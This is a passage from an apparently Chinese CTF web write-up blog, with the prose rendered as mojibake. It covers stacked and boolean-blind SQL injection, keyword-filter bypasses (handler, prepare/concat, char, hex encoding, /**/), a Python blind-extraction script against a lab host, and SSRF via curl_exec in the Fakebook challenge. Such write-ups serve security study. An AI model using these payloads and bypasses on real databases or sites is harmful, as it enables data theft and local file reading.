<pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre>
<p>åªå›æ˜¾ä¸€éƒ¨åˆ†æ•°æ®</p>
<pre><code class="hljs lsl">?inject=<span class="hljs-number">1</span>&#x27;union selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>
er version for the right syntax to use near &#x27;selec\at <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre>
<p>çŒœæµ‹å¯èƒ½æ˜¯unionè¢«åäº†ï¼šå°è¯•åŒå†™ï¼Œéƒ½ä¸è¡Œ</p>
<pre><code class="hljs crystal"><span class="hljs-number">1</span><span class="hljs-string">&#x27;union union s\aelect 1,2%23</span>
<span class="hljs-string">he right syntax to use near &#x27;</span><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">s</span>\<span class="hljs-title">aelect</span> 1,2<span class="hljs-comment">#&#x27;&#x27; at line 1</span></span></code></pre>
<p>åº”è¯¥æ˜¯æ£€æµ‹åˆ°äº†unionæ•´ä¸ªå•è¯ï¼Œç„¶åæŠ¥é”™ï¼Œè¿˜æ˜¯ä¸è¡Œ</p>
<pre><code class="hljs lsl"><span class="hljs-number">1</span>&#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>%<span class="hljs-number">23</span>
t syntax to use near &#x27;u&lt;&gt;nion sel&lt;&gt;ect <span class="hljs-number">1</span>,<span class="hljs-number">2</span>#&#x27;&#x27; at line <span class="hljs-number">1</span></code></pre>
<p><strong>è¯•è¯•å †å æ³¨å…¥</strong>ï¼šæŸ¥çœ‹æ‰€æœ‰åº“å</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;   //è¿™é‡Œ1åå¿…é¡»è¦æœ‰å•å¼•å·ï¼ˆå­—ç¬¦æ³¨å…¥ï¼‰ï¼Œå°¾å·´<span class="hljs-comment">#å¯è¦å¯ä¸è¦</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312212801712.png" srcset="/img/loading.gif" alt="image-20220312212801712"></p>
<p>æŸ¥çœ‹å½“å‰åº“ä¸‹è¡¨åï¼š</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<span class="hljs-comment">#</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213008971.png" srcset="/img/loading.gif" alt="image-20220312213008971"></p>
<h4 id="åˆ©ç”¨handlerç›´æ¥è¯»è¡¨å†…å®¹">åˆ©ç”¨handlerç›´æ¥è¯»è¡¨å†…å®¹</h4>
<blockquote>
<p><strong>mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œè¿™æ¡è¯­å¥ä½¿æˆ‘ä»¬èƒ½å¤Ÿä¸€è¡Œä¸€è¡Œçš„æµè§ˆä¸€ä¸ªè¡¨ä¸­çš„æ•°æ®</strong></p>
<p><strong>ä¸è¿‡handlerè¯­å¥å¹¶ä¸å…·å¤‡selectè¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­</strong></p>
</blockquote>
<pre><code class="hljs sql">?inject=1&#x27;;<span class="hljs-keyword">handler</span> FlagHere <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> a;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;<span class="hljs-keyword">handler</span> a <span class="hljs-keyword">close</span>;<span class="hljs-comment">#</span></code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213440831.png" srcset="/img/loading.gif" alt="image-20220312213440831"></p>
<p>è¯»è¡¨åˆ—åï¼šflagè¡¨æœ‰ä¸€åˆ—</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`FlagHere`</span>;</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220312213600223.png" srcset="/img/loading.gif" alt="image-20220312213600223" style="zoom:67%;"></p>
<p>è€Œå¦ä¸€å¼ è¡¨ï¼šæœ‰ä¸¤åˆ—</p>
<pre><code class="hljs sql">1&#x27;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">`words`</span>;</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313100505291.png" srcset="/img/loading.gif" alt="image-20220313100505291" style="zoom:50%;"></p>
<h4 id="å¦‚æœåˆ©ç”¨å¼ºç½‘æ¯çš„æ€è·¯">å¦‚æœåˆ©ç”¨å¼ºç½‘æ¯çš„æ€è·¯ï¼š</h4>
<blockquote>
<p>1ã€å°†wordsè¡¨åæ›¿æ¢æˆå…¶ä»–çš„</p>
<p>2ã€ç„¶åå°† <code>FlagHere</code> è¿™ä¸ªè¡¨åç§°æ›¿æ¢æˆwords</p>
<p>3ã€åœ¨æŠŠflagè¿™ä¸ªå­—æ®µæ›¿æ¢æˆdata</p>
<p>4ã€æœ€åå†æ’å…¥ï¼ˆæ–°å¢ï¼‰ä¸€ä¸ªidå­—æ®µ</p>
<p>æœ€ç»ˆçš„æŸ¥è¯¢ç»“æœå°±å¯ä»¥è¾“å‡ºæˆ‘ä»¬æ„é€ çš„æ–°çš„wordsäº†</p>
</blockquote>
<pre><code class="hljs sql">1&#x27;;
<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words1;
<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`FlagHere`</span> <span class="hljs-keyword">rename</span> <span class="hljs-keyword">to</span> words;
<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">id</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">50</span>);<span class="hljs-comment">#</span>

å†åˆ©ç”¨ä¸‡èƒ½å¯†ç çˆ†å‡ºè¡¨æ•°æ®</code></pre>
<p>ä½†æ˜¯å›æ˜¾ï¼Œå‘ç°è¿‡æ»¤äº†å¾ˆå¤šï¼š</p>
<pre><code class="hljs sql">return preg_match(&quot;/<span class="hljs-keyword">set</span>|<span class="hljs-keyword">prepare</span>|<span class="hljs-keyword">alter</span>|<span class="hljs-keyword">rename</span>|<span class="hljs-keyword">select</span>|<span class="hljs-keyword">update</span>|<span class="hljs-keyword">delete</span>|<span class="hljs-keyword">drop</span>|<span class="hljs-keyword">insert</span>|<span class="hljs-keyword">where</span>|\./i<span class="hljs-string">&quot;,$inject);</span></code></pre>
<p>é‚£å°±åªèƒ½ç”¨handler</p>
<h4 id="æ€»ç»“">æ€»ç»“ï¼š</h4>
<p>1.prepareçš„è¯­å¥</p>
<pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;[my sql sequece]&#x27;</span>;   //é¢„å®šä¹‰SQLè¯­å¥
<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥
(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span>;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ï¼Œå¯ä»¥ä¸ç”¨ï¼

å³ï¼š
<span class="hljs-keyword">SET</span> @tn = <span class="hljs-string">&#x27;hahaha&#x27;</span>;  //å­˜å‚¨è¡¨å
<span class="hljs-keyword">SET</span> @<span class="hljs-keyword">sql</span> = <span class="hljs-keyword">concat</span>(<span class="hljs-string">&#x27;select * from &#x27;</span>, @tn);  //å­˜å‚¨SQLè¯­å¥
<span class="hljs-keyword">PREPARE</span> <span class="hljs-keyword">name</span> <span class="hljs-keyword">from</span> @<span class="hljs-keyword">sql</span>;   //é¢„å®šä¹‰SQLè¯­å¥
<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">name</span>;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥
(<span class="hljs-keyword">DEALLOCATE</span> || <span class="hljs-keyword">DROP</span>) <span class="hljs-keyword">PREPARE</span> sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ï¼ˆå¯ä»¥ä¸ç”¨ï¼‰</code></pre>
<p>2.selectè¢«è¿‡æ»¤çš„å§¿åŠ¿</p>
<pre><code class="hljs lsl">å¤§å°å†™ç»•è¿‡ã€&lt;&gt;ã€åŒå†™ã€%<span class="hljs-number">0</span>aã€%<span class="hljs-number">0</span>dã€/ï¼**/

åˆ©ç”¨charå‡½æ•°ï¼Œselectâ€”â€”char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>)
<span class="hljs-number">1</span>&#x27;;PREPARE jwt from concat(char(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>), &#x27; * from `<span class="hljs-number">1919810931114514</span>` &#x27;);EXECUTE jwt;#

å¯ä»¥æ‹¼æ¥<span class="hljs-number">1</span>&#x27;;set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from 1919810931114514&quot;</span>);prepare hello from @a;execute hello;# 

ç”¨handlerä»£æ›¿ï¼Œhandlerç›´æ¥è¯»è¡¨çš„ä¸€è¡Œæ•°æ®
<span class="hljs-number">1</span>&#x27;;handler `<span class="hljs-number">1919810931114514</span>` open as a;
handler a read first;
handler a close;#  <span class="hljs-comment">//æ³¨æ„ï¼šè¿™é‡Œæœ‰çš„é¢˜å¿…é¡»close handleræ‰å¯ä»¥è·å–Flag</span>

æˆ–åˆ©ç”¨åå…­è¿›åˆ¶ç¼–ç ç»•è¿‡
set @a=concat(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect flag from `1919810931114514`&quot;</span>); 
<span class="hljs-comment">//æˆ–è€…å°†select * from ` 1919810931114514 `è¿›è¡Œ16è¿›åˆ¶ç¼–ç </span>
<span class="hljs-comment">//@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>
prepare hello from @aï¼›
execute hello;</code></pre>
<h2 id="ciscn2019-ååŒ—èµ›åŒº-day2-web1hack-world">[CISCN2019 ååŒ—èµ›åŒº Day2
Web1]Hack World</h2>
<h4 id="è€ƒç‚¹ç›²æ³¨åªå›æ˜¾trueflasepythonè„šæœ¬åˆ¤æ–­å­—ç¬¦çˆ†flag">è€ƒç‚¹ï¼šç›²æ³¨åªå›æ˜¾true/flaseã€pythonè„šæœ¬åˆ¤æ–­å­—ç¬¦çˆ†flag</h4>
<p>æ€è·¯ï¼šè¾“å…¥æ¡†æµ‹è¯•å‘ç°å›æ˜¾bool(false)ã€æ— æŠ¥é”™ï¼Œå¯¹å…³é”®è¯æ•æ„Ÿï¼Œä½†æ˜¯å‘ç°è¾“å…¥4/2å¯¹åº”è¾“å‡º2çš„å†…å®¹â€”â€”è¯´æ˜æœ‰é€»è¾‘åˆ¤æ–­ï¼Œå°è¯•ifè¯­å¥ï¼ŒæˆåŠŸâ€”â€”å†™è„šæœ¬çˆ†å‡ºflag</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://inanb.github.io/2021/01/30/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">å‚è€ƒWP</a></p>
</blockquote>
<pre><code class="hljs lsl">è¾“å…¥<span class="hljs-number">1</span>å›æ˜¾Hello, glzjin wants a girlfriend.
è¾“å…¥<span class="hljs-number">2</span>å›æ˜¾Do you want to be my girlfriend?
è¾“å…¥â€˜å›æ˜¾**bool(false)**
è¾“å…¥<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">1</span> ,SQL Injection Checked.
è¾“å…¥&#x27;%<span class="hljs-number">23</span>ï¼ŒSQL Injection Checked.
<span class="hljs-number">4</span>/<span class="hljs-number">2</span>â€”â€”Do you want to be my girlfriend?
åªæœ‰ä¸¤ä¸ªæ•°æ®ï¼Œè¾“å…¥<span class="hljs-number">3</span>åŠä»¥ä¸Šå°±è¿”å›Error Occured When Fetch Result.</code></pre>
<p><strong>ä½†æ˜¯å¥½å¤šå­—ç¬¦åŒ…æ‹¬ç©ºæ ¼éƒ½ç»™è¿‡æ»¤äº†</strong></p>
<p>ä½†æ˜¯ï¼š1/1ã€4/2æ˜¯å¯ä»¥å‡ºç»“æœçš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥å€ŸåŠ©<strong>é€»è¾‘åˆ¤æ–­</strong>è¿”å›1å’Œ0ï¼Œåˆ¤æ–­é€»è¾‘çš„çœŸå‡ã€‚</p>
<blockquote>
<p>ifç±»ä¼¼ä¸‰ç›®è¿ç®—
if(æ¡ä»¶,expr2,expr3)ï¼Œå¦‚æœæ¡ä»¶ä¸ºtrue,åˆ™è¿”å›expr2çš„å€¼ï¼Œå¦åˆ™è¿”å›3</p>
</blockquote>
<p>å¸ƒå°”ç›²æ³¨ï¼šåªè¿”å›true/false</p>
<p>ç©ºæ ¼è¢«è¿‡æ»¤ï¼šåˆ©ç”¨ï¼ˆï¼‰</p>
<pre><code class="hljs subunit">id=if(length((select(flag)from(flag)))=42,1,0)
Hello, glzjin wants a girlfriend.
id=if(length((select(flag)from(flag)))=43,1,0)
<span class="hljs-keyword">Error </span>Occured When Fetch Result.</code></pre>
<p>è¯´æ˜flagé•¿åº¦æ˜¯42</p>
<h4 id="guid">GUID</h4>
<p>ä»€ä¹ˆæ˜¯ GUIDï¼Ÿåˆå«uuidï¼ˆé€šç”¨æ ‡è¯†ç¬¦ï¼‰</p>
<ul>
<li><p>å…¨çƒå”¯ä¸€æ ‡è¯†ç¬¦ (GUID)
æ˜¯ä¸€ä¸ªå­—æ¯æ•°å­—æ ‡è¯†ç¬¦ï¼Œç”¨äºæŒ‡ç¤ºäº§å“çš„å”¯ä¸€æ€§å®‰è£…ã€‚åœ¨è®¸å¤šæµè¡Œè½¯ä»¶åº”ç”¨ç¨‹åºï¼ˆä¾‹å¦‚
Web æµè§ˆå™¨å’Œåª’ä½“æ’­æ”¾å™¨ï¼‰ä¸­ï¼Œéƒ½ä½¿ç”¨ GUIDã€‚</p></li>
<li><p>GUID çš„æ ¼å¼ä¸ºâ€œxxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxâ€ï¼Œå…¶ä¸­æ¯ä¸ª x
æ˜¯ 0-9 æˆ– a-f
èŒƒå›´å†…çš„ä¸€ä¸ªåå…­è¿›åˆ¶çš„æ•°å­—ã€‚ä¾‹å¦‚ï¼š6F9619FF-8B86-D011-B42D-00C04FC964FF
å³ä¸ºæœ‰æ•ˆçš„ GUID å€¼</p></li>
<li><p>{CAF53C68-A94C-11D2-BB4A-00C04FA330A6}</p></li>
</ul>
<p>å…ˆå†™å‡ºä¸€ä¸ªæ ¸å¿ƒçš„è¯­å¥ï¼Œåˆ¤æ–­flagçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦asciiç ä¸º101</p>
<pre><code class="hljs angelscript"><span class="hljs-keyword">if</span>((ascii(substr((select(flag)<span class="hljs-keyword">from</span>(flag)),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
ASCII <span class="hljs-number">101</span> :e
Do you want to be my girlfriend?  <span class="hljs-comment">//è¯´æ˜ä¸æ˜¯e	</span></code></pre>
<p>ç„¶åæ”¾åˆ°burpé‡Œçˆ†å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯fï¼ŒASCIIä¸º102</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313112559474.png" srcset="/img/loading.gif" alt="image-20220313112559474" style="zoom:67%;"></p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
url = <span class="hljs-string">&#x27;http://9a1163f4-44f5-4def-9fca-a0c669acfeae.node4.buuoj.cn:81/index.php&#x27;</span>
flag=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">43</span>):
    l = <span class="hljs-number">32</span>
    r = <span class="hljs-number">126</span>
    <span class="hljs-keyword">while</span> r &gt; l:
        mid = <span class="hljs-built_in">int</span>((l+r+<span class="hljs-number">1</span>) / <span class="hljs-number">2</span>)
        x = <span class="hljs-built_in">str</span>(x)
        y = <span class="hljs-built_in">str</span>(mid)
        <span class="hljs-built_in">id</span> = &#123;<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&#x27;if(ascii(substr((select(flag)from(flag)),&#x27;</span>+x+<span class="hljs-string">&#x27;,1))&gt;=&#x27;</span>+y+<span class="hljs-string">&#x27;,1,0)&#x27;</span>&#125;  <span class="hljs-comment">#pythonå­—ç¬¦ä¸²æ‹¼æ¥ç”¨+</span>
        response = requests.post(url=url,data=<span class="hljs-built_in">id</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Hello&quot;</span> <span class="hljs-keyword">in</span> response.text:
            l = mid
        <span class="hljs-keyword">else</span>:
            r = mid<span class="hljs-number">-1</span>
        time.sleep(<span class="hljs-number">0.03</span>)  <span class="hljs-comment">#å»¶æ—¶å¤„ç†é˜²æ­¢é¢‘ç¹è®¿é—®å¯¼è‡´ç½‘é¡µä¸æ­£å¸¸å›æ˜¾äº§ç”Ÿåç‚¹ï¼ˆå¾—ç›Šäºsqlå»¶æ—¶æ³¨å…¥äº†è§£äº†sleepå‡½æ•°ï¼‰</span>
    flag+=(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))
    print(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(r)))
print(flag)</code></pre>
<h2 id="ç½‘é¼æ¯-2018fakebook">[ç½‘é¼æ¯ 2018]Fakebook</h2>
<h4 id="è€ƒç‚¹sqlæ³¨å…¥ååºåˆ—åŒ–curl_execssrf">è€ƒç‚¹ï¼šSQLæ³¨å…¥ã€ååºåˆ—åŒ–+curl_execã€SSRF</h4>
<p>è®¿é—®tobots.txtï¼Œå¾—åˆ°å¤‡ä»½æ–‡ä»¶</p>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313134519393.png" srcset="/img/loading.gif" alt="image-20220313134519393"></p>
<p>è®¿é—®/user.php.bakï¼Œä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå¾—åˆ°phpä»£ç </p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;&quot;</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;name = $name;
        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;
        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$url</span>)</span>
<span class="hljs-function">    </span>&#123;
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
        $output = curl_exec($ch);   <span class="hljs-comment">//æ³¨æ„ï¼SSRF</span>
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
        &#125;
        curl_close($ch);

        <span class="hljs-keyword">return</span> $output;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);
    &#125;

&#125;</code></pre>
<p>getæ–¹æ³•ä¸­ï¼Œ<strong>curl_exec()å¦‚æœä½¿ç”¨ä¸å½“å°±ä¼šå¯¼è‡´ssrfæ¼æ´</strong>ã€‚æœ‰ä¸€ç‚¹æ€è·¯äº†ï¼Œè€Œæˆ‘ä»¬åœ¨å¾¡å‰‘æ‰«åˆ°äº†flag.phpï¼ˆæˆ‘æ²¡æ‰«åˆ°ï¼ŒçŒœæµ‹è·Ÿindex.phpåœ¨åŒä¸€ç›®å½•ï¼‰ã€‚çŒœæµ‹å¯èƒ½flag.phpå¤„äºå†…ç½‘ï¼Œ</p>
<p>å¦‚æœç”¨ssrfè®¿é—®flag.phpï¼Œå¯ä»¥==ç”¨ä¼ªåè®®file://var/www/html/flag.phpè®¿é—®ã€‚==</p>
<ol type="1">
<li>éšä¾¿æ³¨å†Œä¸€ä¸ªç”¨æˆ·abd,å¯†ç 123ï¼Œage11ï¼Œblog:https://www.baidu.comï¼Œè®¿é—®æ³¨å†Œçš„ç”¨æˆ·ï¼Œå‘ç°è¿”å›åˆšåˆšæ³¨å†Œçš„å†…å®¹ï¼Œblogæ˜¯è¾“å…¥çš„www.baidu.com</li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152014417.png" srcset="/img/loading.gif" alt="image-20220313152014417"></p>
<ol start="2" type="1">
<li>ç„¶åä¸‹é¢çš„contentæŸ¥çœ‹æºç ï¼Œè§£ç å‘ç°æ˜¯www.baidu.comçš„é¦–é¡µå†…å®¹==ã€‹<strong>æœ‰æ€è·¯äº†</strong>ï¼Œblogç”¨file://è¯»æœ¬åœ°æ–‡ä»¶ï¼Œä¸‹é¢çš„contentå›æ˜¾base64çš„æ–‡ä»¶æºç ï¼Œåˆ©ç”¨ssrfä¼ªåè®®è¯»æœ¬åœ°æºç </li>
</ol>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313152050715.png" srcset="/img/loading.gif" alt="image-20220313152050715"></p>
<ol start="3" type="1">
<li><p>ä½†æ˜¯ç›´æ¥æ³¨å†Œç”¨æˆ·ï¼Œblogé‚£é‡Œæœ‰ä¸¥æ ¼çš„pregè¿‡æ»¤ï¼š<strong>æ‰€ä»¥æƒ³åœ¨è¿™ä¸ªä½ç½®è¿ç”¨fileåè®®ä¸è¡Œ</strong></p></li>
<li><p>æ³¨å†Œç”¨æˆ·åï¼Œè®¿é—®ç”¨æˆ·æ—¶å‘ç°urlé‡Œæœ‰<strong>å‚æ•°noï¼Œå°è¯•ä¿®æ”¹ï¼Œå‘ç°æ³¨å…¥ç‚¹ï¼Œä½†ä¹Ÿæœ‰waf</strong></p></li>
</ol>
<pre><code class="hljs pgsql">/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">20</span><span class="hljs-keyword">order</span>%<span class="hljs-number">20</span><span class="hljs-keyword">by</span>%<span class="hljs-number">205</span>   //  [*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;5&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;order clause&#x27;</span>)â€”â€”<span class="hljs-number">4</span>åˆ—

/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>%<span class="hljs-number">27</span><span class="hljs-keyword">union</span>%<span class="hljs-number">20</span><span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%<span class="hljs-number">23</span>  //<span class="hljs-keyword">no</span> hack ~_~

/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^updatexml   //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;updatexml&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;where clause&#x27;</span>)
/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(flag)<span class="hljs-keyword">from</span>(information_schema.schemata)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)  //[*] query error! (<span class="hljs-type">Unknown</span> <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;field list&#x27;</span>)   //information_schema.schemata æ‰€æœ‰åº“å

/<span class="hljs-keyword">view</span>.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)))=<span class="hljs-number">42</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)
//information_schema.<span class="hljs-keyword">tables</span>ï¼šæ‰€æœ‰è¡¨é›†åˆï¼Œ

<span class="hljs-number">1</span>^<span class="hljs-keyword">if</span>(length((<span class="hljs-keyword">select</span>(passwd)<span class="hljs-keyword">from</span>(users)))=<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)ï¼Œçˆ†å‡º<span class="hljs-keyword">password</span>é•¿åº¦ï¼š<span class="hljs-number">128</span>   //å¤ªéº»çƒ¦äº†ï¼Œå¡å£³ï¼Œä¸çŸ¥é“å’‹è¯»è¡¨ã€åˆ—åäº†</code></pre>
<ol start="5" type="1">
<li>æŸ¥çœ‹WPå‘ç°unionselectè¢«è¿‡æ»¤ï¼Œè€Œä¸”åªå¯¹ä»–ä¿©ä¸­é—´å¾—ç©ºæ ¼è¿‡æ»¤â€”â€”==ä¸­é—´åŠ /**/å³å¯ç»•è¿‡==</li>
</ol>
<pre><code class="hljs crystal"> ?no=-<span class="hljs-number">1</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,<span class="hljs-title">user</span>(),3,4--+ã€€ã€€ã€€ã€€//æ•°æ®åº“ä¿¡æ¯</span>
root@localhost	  ==ã€‹rootæƒé™ï¼Œå¯ä»¥sqlè¯»æ–‡ä»¶</code></pre>
<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20220313144801377.png" srcset="/img/loading.gif" alt="image-20220313144801377" style="zoom: 50%;"></p>
<h4 id="æ³•1sqlæ³¨å…¥rootç›´æ¥è¯»æœ¬åœ°æ–‡ä»¶">æ³•1ï¼šSQLæ³¨å…¥rootç›´æ¥è¯»æœ¬åœ°æ–‡ä»¶</h4>
<p>secure-file-privæ˜¯ä¸€ä¸ªç³»ç»Ÿå˜é‡ï¼Œå¯¹äºæ–‡ä»¶è¯»/å†™åŠŸèƒ½è¿›è¡Œé™åˆ¶ã€‚å…·ä½“å¦‚ä¸‹ï¼š</p>
<ul>
<li><p>æ— å†…å®¹ï¼Œè¡¨ç¤ºæ— é™åˆ¶ã€‚</p></li>
<li><p>ä¸ºNULLï¼Œè¡¨ç¤ºç¦æ­¢æ–‡ä»¶è¯»/å†™ã€‚</p></li>
